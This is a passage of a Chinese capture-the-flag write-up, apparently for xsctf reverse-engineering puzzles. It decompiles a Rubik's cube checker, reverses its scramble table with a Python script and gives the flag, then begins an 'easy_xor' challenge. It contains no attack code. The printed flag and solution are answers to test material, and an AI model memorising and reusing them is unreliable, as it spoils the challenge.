&lt;回车&gt;,每步操作用空格分开,逆时针加上’字符</li><li>flag格式为xsctf{formula},其中formula为4个魔方的还原步骤依次连在一起,去掉空格,取其md5</li><li>本题在Ubuntu22下编译,请不要使用ubuntu18<blockquote><p>6个面，一共24种旋转操作，分析时需要对号入座</p></blockquote></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Bh] [rbp-3B5h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-3B4h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">160</span>]; <span class="comment">// [rsp+10h] [rbp-3B0h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7[<span class="number">40</span>]; <span class="comment">// [rsp+B0h] [rbp-310h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">160</span>]; <span class="comment">// [rsp+150h] [rbp-270h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v9[<span class="number">114</span>]; <span class="comment">// [rsp+1F0h] [rbp-1D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+3B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  cube_init((__int64)v9);</span><br><span class="line">  print_menu(v9, argv);</span><br><span class="line">  v4 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt;= <span class="string">&#x27;0&#x27;</span> || v4 &gt; <span class="number">52</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">53</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;bye!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    formula_get_by_id((__int64)v6, v4 - <span class="number">48</span>);</span><br><span class="line">    cube_scramble((__int64)v9, (__int64)v6);</span><br><span class="line">    cube_print((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v9);</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    formula_input((<span class="keyword">char</span> *)v7);</span><br><span class="line">    <span class="keyword">while</span> ( v7[v5] != <span class="number">24</span> )</span><br><span class="line">      cube_rotating((__int64)v9, v7[v5++]);</span><br><span class="line">    cube_print((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v9);</span><br><span class="line">    formula_reverse(v7, v8);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)cube_isorigin(v9) || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)formula_cmp(v6, v8) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)cube_isorigin(v9) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)formula_cmp(v6, v8) )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Restore successfully!!!But not reverse!!!&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Restore failed!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Restore successfully!!!You reversed the formula!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;press anykey to continue...&quot;</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">~$ .&#x2F;cube3</span><br><span class="line">                           三阶魔方</span><br><span class="line">        _______________________________________________</span><br><span class="line">        |                                             |</span><br><span class="line">        |        请输入编号:                           |</span><br><span class="line">        |       1.打乱1     2.打乱2                    |</span><br><span class="line">        |       3.打乱3     4.打乱4                    |</span><br><span class="line">        |       5.退出程序                             |</span><br><span class="line">        |                                             |</span><br><span class="line">        |                                             |</span><br><span class="line">        -----------------------------------------------</span><br><span class="line">                    请输入编号[1&#x2F;2]:4</span><br><span class="line">                            ________________</span><br><span class="line">                            |  2 |  3 |  3 |</span><br><span class="line">                            +----+----+----+</span><br><span class="line">                            |  2 |  4 |  4 |</span><br><span class="line">                            +----+----+----+</span><br><span class="line">                            |  5 |  3 |  6 |</span><br><span class="line">                            +----+----+----+</span><br><span class="line">                           &#x2F;  4 &#x2F; 5  &#x2F; 1  &#x2F;|</span><br><span class="line">                          &#x2F;____&#x2F;____&#x2F;____&#x2F; |</span><br><span class="line">                         &#x2F;  1 &#x2F;  1 &#x2F;  6 &#x2F;|3+</span><br><span class="line">                        &#x2F;____&#x2F;____&#x2F;____&#x2F; |&#x2F;|</span><br><span class="line">                       &#x2F;  3 &#x2F;  5 &#x2F;  1 &#x2F;|1|1|</span><br><span class="line">        ______________&#x2F;____&#x2F;____&#x2F;____&#x2F;4|&#x2F;|&#x2F;|</span><br><span class="line">        | 1 |  5 |  5 |  2 |  4 |  6 |&#x2F;|6+1|</span><br><span class="line">        +---+----+----+----+----+----+6|&#x2F;|&#x2F;</span><br><span class="line">        | 5 |  5 |  2 |  6 |  3 |  3 |&#x2F;|6+</span><br><span class="line">        +---+----+----+----+----+----+2|&#x2F;</span><br><span class="line">        | 6 |  2 |  3 |  6 |  3 |  5 |&#x2F;</span><br><span class="line">        +---+----+----+----+----+----+</span><br><span class="line">                      |  2 |  1 |  4 |</span><br><span class="line">                      +----+----+----+</span><br><span class="line">                      |  4 |  2 |  4 |</span><br><span class="line">                      +----+----+----+</span><br><span class="line">                      |  4 |  2 |  5 |</span><br><span class="line">                      +----+----+----+</span><br><span class="line">Enter a formula and separate each step with a space</span><br><span class="line">Tip: The format of the operation is like R2 R2&#39; R</span><br><span class="line">[&#39;] represents a counterclockwise rotation</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>需要输入魔方的公式<br><a href="https://zhuanlan.zhihu.com/p/396215313">【初级篇】三阶魔方入门教程 - 知乎 (zhihu.com)</a></p><p>要还原魔方，最简单的方法是反着拧<br>要反着拧，就要找到打乱的顺序</p><p>ida大部分函数看不懂没关系，可以凭感觉找到存储打乱顺序的变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">formula_get_by_id</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-294h]</span></span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">162</span>]; <span class="comment">// [rsp+20h] [rbp-290h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+2A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x280</span>uLL);</span><br><span class="line">  v4[<span class="number">0</span>] = <span class="number">23</span>;</span><br><span class="line">  v4[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">  v4[<span class="number">2</span>] = <span class="number">4</span>;</span><br><span class="line">  v4[<span class="number">3</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">4</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">5</span>] = <span class="number">9</span>;</span><br><span class="line">  v4[<span class="number">6</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">7</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">8</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">9</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">10</span>] = <span class="number">20</span>;</span><br><span class="line">  v4[<span class="number">11</span>] = <span class="number">11</span>;</span><br><span class="line">  v4[<span class="number">12</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">13</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">14</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">15</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">16</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">17</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">18</span>] = <span class="number">4</span>;</span><br><span class="line">  v4[<span class="number">19</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">20</span>] = <span class="number">24</span>;</span><br><span class="line">  v4[<span class="number">40</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">41</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">42</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">43</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">44</span>] = <span class="number">1</span>;</span><br><span class="line">  v4[<span class="number">45</span>] = <span class="number">4</span>;</span><br><span class="line">  v4[<span class="number">46</span>] = <span class="number">2</span>;</span><br><span class="line">  v4[<span class="number">47</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">48</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">49</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">50</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">51</span>] = <span class="number">10</span>;</span><br><span class="line">  v4[<span class="number">52</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">53</span>] = <span class="number">21</span>;</span><br><span class="line">  v4[<span class="number">54</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">55</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">56</span>] = <span class="number">17</span>;</span><br><span class="line">  v4[<span class="number">57</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">58</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">59</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">60</span>] = <span class="number">24</span>;</span><br><span class="line">  v4[<span class="number">80</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">81</span>] = <span class="number">15</span>;</span><br><span class="line">  v4[<span class="number">82</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">83</span>] = <span class="number">2</span>;</span><br><span class="line">  v4[<span class="number">84</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">85</span>] = <span class="number">17</span>;</span><br><span class="line">  v4[<span class="number">86</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">87</span>] = <span class="number">9</span>;</span><br><span class="line">  v4[<span class="number">88</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">89</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">90</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">91</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">92</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">93</span>] = <span class="number">3</span>;</span><br><span class="line">  v4[<span class="number">94</span>] = <span class="number">11</span>;</span><br><span class="line">  v4[<span class="number">95</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">96</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">97</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">98</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">99</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">100</span>] = <span class="number">24</span>;</span><br><span class="line">  v4[<span class="number">120</span>] = <span class="number">20</span>;</span><br><span class="line">  v4[<span class="number">121</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">122</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">123</span>] = <span class="number">21</span>;</span><br><span class="line">  v4[<span class="number">124</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">125</span>] = <span class="number">23</span>;</span><br><span class="line">  v4[<span class="number">126</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">127</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">128</span>] = <span class="number">3</span>;</span><br><span class="line">  v4[<span class="number">129</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">130</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">131</span>] = <span class="number">3</span>;</span><br><span class="line">  v4[<span class="number">132</span>] = <span class="number">0x16</span>;</span><br><span class="line">  v4[<span class="number">134</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">135</span>] = <span class="number">1</span>;</span><br><span class="line">  v4[<span class="number">136</span>] = <span class="number">0x12</span>;</span><br><span class="line">  v4[<span class="number">137</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">138</span>] = <span class="number">0x12</span>;</span><br><span class="line">  v4[<span class="number">139</span>] = <span class="number">0xB</span>;</span><br><span class="line">  v4[<span class="number">140</span>] = <span class="number">0x18</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v4[<span class="number">40</span> * a2 - <span class="number">40</span> + i] != <span class="number">24</span>; ++i )</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">4L</span>L * i) = v4[<span class="number">40</span> * a2 - <span class="number">40</span> + i];</span><br><span class="line">  *(_DWORD *)(<span class="number">4L</span>L * i + a1) = <span class="number">24</span>;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为题目说一共有24种操作，刚好是v4元素的取值范围-1<br>减一的原因是因为有四个魔方，最大的元素（24）的作用类似分隔符，通过主函数的while语句也可以判断出来，而且整个v4数组刚好被值为24的元素分隔成4部分，刚好对应4个魔方</p><p>因此可以将这些元素提取出来（有坑），然后映射到对应的公式，再反着输出就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">s = <span class="built_in">open</span>(<span class="string">&#x27;./tmp.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(s))</span><br><span class="line"></span><br><span class="line">ss = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    num = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(i)):</span><br><span class="line">        <span class="keyword">if</span> i[j] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            num = i[j+<span class="number">1</span>:<span class="number">-2</span>]</span><br><span class="line">    ss.append(<span class="built_in">int</span>(num))</span><br><span class="line"></span><br><span class="line">rotate = [</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;U\&#x27;&#x27;</span>, <span class="string">&#x27;U2&#x27;</span>, <span class="string">&#x27;U2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;D\&#x27;&#x27;</span>, <span class="string">&#x27;D2&#x27;</span>, <span class="string">&#x27;D2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;F\&#x27;&#x27;</span>, <span class="string">&#x27;F2&#x27;</span>, <span class="string">&#x27;F2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;B\&#x27;&#x27;</span>, <span class="string">&#x27;B2&#x27;</span>, <span class="string">&#x27;B2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;L\&#x27;&#x27;</span>, <span class="string">&#x27;L2&#x27;</span>, <span class="string">&#x27;L2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;R\&#x27;&#x27;</span>, <span class="string">&#x27;R2&#x27;</span>, <span class="string">&#x27;R2\&#x27;&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ss:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">24</span>:</span><br><span class="line">        print()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(rotate[i], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ss)<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    <span class="keyword">if</span> ss[i] == <span class="number">24</span>:</span><br><span class="line">        print()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> rotate[ss[i]]:</span><br><span class="line">            print(rotate[ss[i]<span class="number">-1</span>], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(rotate[ss[i]+<span class="number">1</span>], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">print()</span><br><span class="line">sss = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">B2&#x27; D&#x27; L2&#x27; F&#x27; D2&#x27; B2&#x27; R2&#x27; B F2 R&#x27; D2 B L2&#x27; B&#x27; F L2&#x27; F&#x27; D&#x27; U2 R2</span></span><br><span class="line"><span class="string">B&#x27; D2 F&#x27; L D2 L2 R L2 F2&#x27; D2&#x27; L2 R2&#x27; F&#x27; U2&#x27; D&#x27; U B D2 R2&#x27; D2&#x27;</span></span><br><span class="line"><span class="string">R2&#x27; D2&#x27; L2&#x27; D B2&#x27; F2 U2 B&#x27; D L2&#x27; B&#x27; D2 F B&#x27; L D U2&#x27; L2 B2 D</span></span><br><span class="line"><span class="string">F2 L2&#x27; D2 L2&#x27; U F&#x27; U&#x27; R2&#x27; U2 D2 L2&#x27; U2 B L2 R2 B2&#x27; R D2 B&#x27; R&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ssss = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sss:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&#x27; &#x27;</span> <span class="keyword">and</span> i != <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">        ssss += i</span><br><span class="line"></span><br><span class="line">print(ssss)</span><br></pre></td></tr></table></figure><p>这样就可以得到四个魔方的解法，可以使用程序验证，最后再将解法按照题目要求处理就行</p><p><code>xsctf&#123;0a15a3168e6bf08df8178186312b0396&#125;</code></p><p>坑</p><ul><li>v4数组的定义种少了一个元素<code>v4[133]</code>，需要动态调试得到这个元素的值</li><li>因为是4个魔方一起反着输出，所以第一个魔方的解法应该对应第四行的输出</li><li>最后串起来的时候是<code>第一个魔方的解法+第二个魔方的解法...</code>，即第四行+第三行+…</li></ul><h2 id="easy-xor"><a href="#easy-xor" class="headerlink" title="easy_xor"></a>easy_xor</h2><p>核心代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+33h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+33h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v7 = key[v9 % <span class="number">4</span>] ^ v8;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v7--;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = v11++;</span><br><span class="line">      s[v3] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = v11++;</span><br><span class="line">    s[v5] = <span class="number">0</span>;</span><br><span class="line">    ++v9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v11 &lt;= <span class="number">2559</span> )</span><br><span class="line">    s[v11++] = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2559</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( r[i] != s[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Lose lose lose!&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">2560</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Win win win!&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 